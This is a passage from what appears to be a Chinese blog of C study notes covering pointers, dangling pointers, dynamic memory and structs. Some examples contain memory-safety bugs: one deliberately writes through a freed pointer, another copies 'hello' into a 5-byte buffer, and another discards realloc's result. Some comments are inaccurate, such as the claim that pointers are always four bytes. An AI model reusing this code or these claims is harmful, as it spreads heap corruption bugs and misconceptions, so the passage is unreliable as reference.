j;</span><br><span class="line"></span><br><span class="line">    p = a;</span><br><span class="line">    j = *p++;     <span class="comment">// j = *p; p=p+1。     </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a[0]=%d, j=%d, *p=%d \n"</span>, a[<span class="number">0</span>], j, *p);  <span class="comment">// 2,2,7</span></span><br><span class="line"></span><br><span class="line">    j = p[<span class="number">0</span>]++; <span class="comment">// j=p[0],  p[0] = p[0] +1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a[0]=%d, j=%d, *p=%d \n"</span>, a[<span class="number">0</span>], j, *p);  <span class="comment">// 2,7,8  ？？？  </span></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//野指针: free以后的指针未被赋值为NULL  (指向了一个未知的空间)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *p, *p1, *p2, *p3;</span><br><span class="line">    p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">    p = <span class="literal">NULL</span>;   <span class="comment">// 赋值null以后，后面用的话会崩溃，能迅速找到问题</span></span><br><span class="line"></span><br><span class="line">    p1 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);  </span><br><span class="line">    *p1 = <span class="number">2</span>;  <span class="comment">// 没有free</span></span><br><span class="line"></span><br><span class="line">    p2 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p2 = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    p3 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p3 = <span class="number">3</span>;</span><br><span class="line">    *p1 = <span class="number">20</span>; <span class="comment">// 以为p1free了，这里又赋值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p3 = %d"</span>, *p3);   <span class="comment">//  20了    malloc有缓存机制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 经典程序：互换两个数字</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange_two</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line"><span class="comment">//int t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//之前的做法</span></span><br><span class="line"><span class="comment">//t=a;</span></span><br><span class="line"><span class="comment">//a=b;</span></span><br><span class="line"><span class="comment">//b=t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在要求调用一个函数实现</span></span><br><span class="line">test_exchange3(&amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d,b=%d"</span>,a,b);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能完成互换功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">t=a;</span><br><span class="line">a=b;</span><br><span class="line">b=t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能完成互换功能，只是把q和p的值换了，a和b并没有互换</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange2</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *t; <span class="comment">// 如果要互换，变量类型必须一致</span></span><br><span class="line">t = p; </span><br><span class="line">p = q;</span><br><span class="line">q = t;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 形参的改变，不会改变实参的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以完成互换: p是a的地址，*p就是a</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange3</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t; <span class="comment">// 如果要互换，变量类型必须一致</span></span><br><span class="line">t = *p;  <span class="comment">// *p是int，p是int* </span></span><br><span class="line">*p = *q;</span><br><span class="line">*q = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// *的含义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.乘法</span></span><br><span class="line"><span class="comment">//2.定义指针变量 </span></span><br><span class="line"><span class="keyword">int</span> *p;  <span class="comment">//定义了一个叫p的变，int *表示p只能存放地址</span></span><br><span class="line"><span class="comment">//3.指针运算符：取地址的逆运算/间接访问</span></span><br><span class="line"><span class="comment">// 放在已经定义好的指针变量的前面，取改指针的值</span></span><br><span class="line"><span class="comment">//*p 表示以p的内容为地址的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写法：下面三种是等价的</span></span><br><span class="line"><span class="comment">//int * p;</span></span><br><span class="line"><span class="comment">//int *p;</span></span><br><span class="line"><span class="comment">//int* p;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">脏数据</span></span><br><span class="line"><span class="comment">申请的空间不释放：内存泄露</span></span><br><span class="line"><span class="comment">堆空间：一旦申请，一直占用，除非free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">    p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);</span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">"hello"</span>);   <span class="comment">// p指向堆空间</span></span><br><span class="line">    <span class="comment">// p = "hellp";</span></span><br><span class="line">    <span class="built_in">puts</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">// 释放</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free p ~~~~~~~~~~~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 一个指针变量到底占几个字节？</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指向不同类型，是不同的，比如int 一般是4个字节, char就是1个。     sizeof()可以查看：sizeof(double)</span></span><br><span class="line"><span class="comment">p,q,r所占的字节数是一样的</span></span><br><span class="line"><span class="comment">【总结：】一个指针变量，无论他指向的变量占几个字节，该指针变量只占四个字节。</span></span><br><span class="line"><span class="comment">一个变量的地址使用该变量首字节的地址来表示</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存分配（重点）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.传统数组的缺点</span></span><br><span class="line"><span class="comment">a.数组长度必须事先制定，且只能是长整数，不能是变量（int len=5; int a[len]; 这样是错误的）</span></span><br><span class="line"><span class="comment">b.传统形式定义的数组，该数组的内存，程序员无法手动释放（一旦定义，该分配空间一直存在，直到数组所在的函数运行结束，数组的空间才会被系统释放）</span></span><br><span class="line"><span class="comment">c.数组的长度不能再函数运行过程中动态扩充或缩小(长度一旦定义，其长度就不能再更改)</span></span><br><span class="line"><span class="comment">d.A函数定义的数组，在A函数运行期间可以被其他函数使用；但A函数执行完毕后，A函数中的数组将无法再被其他函数使用</span></span><br><span class="line"><span class="comment">传统数组也叫静态数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.为什么需要动态分配内存</span></span><br><span class="line"><span class="comment">解决了传统数组的4个缺陷</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.动态内存分配举例_  动态数组的构造</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.静态内存和动态内存的比较</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5.跨函数使用内存的问题</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// malloc 是memory(内存) allocate(分配)的缩写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.要使用malloc，必须添加malloc.h或stdlib.h头文件</span></span><br><span class="line"><span class="comment">2.malloc只有一个形参，且形参必须是整数类型</span></span><br><span class="line"><span class="comment">3.上面，表示请求系统为本程序分配5个字节</span></span><br><span class="line"><span class="comment">4.malloc函数只能返回第一个字节的地址，所以前面要把地址强制转换为int*</span></span><br><span class="line"><span class="comment">5.p本身的内存是静态分配的，p所指向的内存是动态分配的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">"hello"</span>);   <span class="comment">// p指向堆空间</span></span><br><span class="line">    <span class="comment">// p = h e l l o \o;</span></span><br><span class="line">    <span class="built_in">puts</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">// 释放p所指向的内存 （p本身的内存是静态的，不能由程序员手动释放）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free p ~~~~~~~~~~~"</span>);</span><br><span class="line"><span class="comment">// 脏数据</span></span><br><span class="line"><span class="comment">// 申请的空间不释放：内存泄露</span></span><br><span class="line"><span class="comment">// 堆空间：一旦申请，一直占用，除非free</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// *p = 200; // error</span></span><br><span class="line"><span class="comment">// q = 20   //error</span></span><br><span class="line"><span class="comment">// q是p的一份拷贝(副本)</span></span><br><span class="line"><span class="comment">// **q=200  // error</span></span><br><span class="line">*q=<span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//int *arr = (int*)malloc(20);</span></span><br><span class="line"> <span class="comment">//   int *p;</span></span><br><span class="line"> <span class="comment">//   arr[0] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[1] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[2] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[3] = 1;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//   p = (int*)realloc(arr, 40);    // 扩展</span></span><br><span class="line"> <span class="comment">//   p[4] = 6;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">*p = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *p); <span class="comment">//10</span></span><br><span class="line">f(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *p); <span class="comment">//200</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存分配举例 动态一维数组的构造</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">int</span> *pArr;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输出要存放元素的个数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;len); <span class="comment">// 5</span></span><br><span class="line">pArr = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>*len);  <span class="comment">// 数组长度为len； 5*4=20,（默认pArr指向第一个字节，但是由于进行了int强转，所以pArr指向前四个字节,pArr指向后面4个字节）</span></span><br><span class="line"><span class="comment">//类似于 int pArr[len];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;pArr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"一维数组的内容是: \n"</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, pArr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">realloc</span>(pArr, <span class="number">40</span>);    <span class="comment">// 扩展</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放数组</span></span><br><span class="line"><span class="built_in">free</span>(pArr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存和静态内存的比较</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">静态内存是由系统自动分配，由系统自动释放，是在栈分配的</span></span><br><span class="line"><span class="comment">动态内存是由程序员手动分配，手动释放，是由堆分配的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc是堆分配的</span></span><br><span class="line"><span class="comment">栈是存储结构，堆是排序方式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multi_test</span><span class="params">(<span class="keyword">int</span> **pp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">300</span>;</span><br><span class="line"><span class="comment">//  pp是p的地址，那*pp 就是p</span></span><br><span class="line">*pp = &amp;j;   <span class="comment">// 修改</span></span><br><span class="line">**pp = <span class="number">200</span>; <span class="comment">// 修改</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多级指针（意义：跨函数使用内存）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two_pointer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 【场景】：当在子函数中需要修改主函数某一个一级指针变量的值，就需要二级指针</span></span><br><span class="line">    <span class="comment">//char b[N][10] = &#123;"lilei","hanmeimei","xiyangyang","huitailang", "xiongda"&#125;;</span></span><br><span class="line">    <span class="comment">//char * p[N];  // 指针数组，里面存储的指针类型就是 二级指针   // &amp;p[0]        每次偏移是固定的，64位数下就是8个字节</span></span><br><span class="line">    <span class="comment">//// char **p2;</span></span><br><span class="line">    <span class="comment">//int i;</span></span><br><span class="line">    <span class="comment">//for(i=0; i&lt;N; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    p[i] = b[i];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//for(i=0; i&lt;N; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    puts(p[i]);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;i;</span><br><span class="line"><span class="keyword">int</span> **q = &amp;p;</span><br><span class="line"><span class="keyword">int</span> ***r = &amp;q;</span><br><span class="line"></span><br><span class="line"><span class="comment">//r = &amp;p;   // 错误，因为r是int**类型，r只能存放int**类型变量的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,***r); <span class="comment">// r的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在另一个函数内部改变变量值</span></span><br><span class="line">multi_test(&amp;p);  <span class="comment">// p是int *, 那么 &amp;p是int**</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f1</span><span class="params">(<span class="keyword">int</span> **q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">5</span>;</span><br><span class="line"><span class="comment">//*q等价于p，q和**q都不等价于p</span></span><br><span class="line"><span class="comment">// *q=i // error</span></span><br><span class="line">*q = &amp;i;  <span class="comment">// p=&amp;i</span></span><br><span class="line"><span class="comment">//**q=i;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态变量不能跨函数使用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"></span><br><span class="line">f1(&amp;p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p);  <span class="comment">// 本语句语法没有问题，但逻辑上有问题（因为f函数中i的静态分配的，f结束，i的空间就释放了）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f2</span><span class="params">(<span class="keyword">int</span> **q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*q = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="comment">// 等价于p = (int *)malloc(sizeof(int));</span></span><br><span class="line"><span class="comment">//q=5;  // error</span></span><br><span class="line"><span class="comment">//*q=5; // p=5   error</span></span><br><span class="line">**q=<span class="number">5</span>; <span class="comment">// *p=5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存可以跨函数使用（重点）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">f2(&amp;p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p); <span class="comment">// 能改变。p指向的是上面堆里面分配的空间</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><p>jiegouti.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">struc_func</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputStudent</span><span class="params">(struct Student *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent</span><span class="params">(struct Student)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent2</span><span class="params">(struct Student *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_union</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jiegouti.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">为什么需要结构体？</span></span><br><span class="line"><span class="comment">为了表示一些复杂的事物，而普通的数据类型无法满足实际需求</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">结构体：</span></span><br><span class="line"><span class="comment">把一些基本类型组合到一起，形成的一个新的符合数据类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">大小：</span></span><br><span class="line"><span class="comment">结构体：总大小一般情况下等于各成员大小之和(先不考虑内存对齐)</span></span><br><span class="line"><span class="comment">共用体：大小等于成员中最大的那个大小。（通常和结构体一起使用）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如何定义(推荐第一种)：</span></span><br><span class="line"><span class="comment">1. 推荐（这只是定义了一个新的数据类型，并没有定义变量）</span></span><br><span class="line"><span class="comment"> struct student&#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 这样只能定义一次</span></span><br><span class="line"><span class="comment"> struct student&#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125; st1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 3. 类型都没写...</span></span><br><span class="line"><span class="comment"> struct &#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125; st1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> //赋值和初始化(定义同时可以整体赋值,定义玩之后只能单个赋值)</span></span><br><span class="line"><span class="comment"> 定义同时初始化： struct student s1 = &#123;1,'xxx',18&#125;;</span></span><br><span class="line"><span class="comment"> 先定义，后赋值：</span></span><br><span class="line"><span class="comment">  struct student s2;</span></span><br><span class="line"><span class="comment">  s2.num=1;</span></span><br><span class="line"><span class="comment">  s2.name='yyy';</span></span><br><span class="line"><span class="comment">  s2.age=19;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 